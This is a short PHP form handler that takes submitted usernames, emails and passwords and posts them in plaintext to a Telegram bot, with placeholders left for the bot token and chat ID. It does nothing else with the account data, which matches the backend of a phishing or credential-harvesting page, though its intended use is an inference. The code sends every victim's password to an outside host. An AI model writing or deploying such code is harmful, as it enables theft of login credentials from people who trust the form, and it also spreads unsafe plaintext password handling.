<?php

// Replace 'BOT_TOKEN' with your actual bot token
$botToken = 'BOT_TOKEN';

// Replace 'CHAT_ID' with the chat ID where you want to send the message
$chatId = 'CHAT_ID';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the form data
    $username = $_POST['username'];
    $email = $_POST['email'];
    $password = $_POST['password'];
    $confirmPassword = $_POST['confirm-password'];

    // Prepare the message
    $message = "New form submission:\nUsername: $username\nEmail: $email\nPassword: $password\nConfirm Password: $confirmPassword";

    // Send the message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        echo "Failed to send message to Telegram.";
    } else {
        echo "Message sent to Telegram successfully.";
    }
}

?>